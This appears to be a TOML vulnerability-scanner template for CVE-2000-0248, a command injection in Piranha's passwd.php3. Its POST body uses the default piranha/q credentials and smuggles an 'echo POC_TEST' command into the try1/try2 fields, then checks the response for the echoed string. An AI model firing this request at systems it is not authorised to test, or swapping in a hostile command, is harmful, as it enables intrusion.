[info]
author = "AVE"
description = "CVE-2000-0248 是 Piranha Web Password 管理工具中的命令注入漏洞，经过认证的攻击者可通过 passwd.php3 的 try1/try2 参数注入系统命令，利用默认凭据 piranha/q 可未授权利用"
id = "POC-AVE-2000-0709"
name = "CVE-2000-0248 PoC"
severity = "critical"
tags = ["cve-2000-0248"]
vuln_id = [
    "CVE-2000-0248",
    "AVE-2000-0709",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/piranha/secure/passwd.php3"
protocol = "http"

[poc.requests.body]
content = "piranha=q&passwd=ACCEPT&try1=echo+POC_TEST&try2=echo+POC_TEST"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["POC_TEST"]
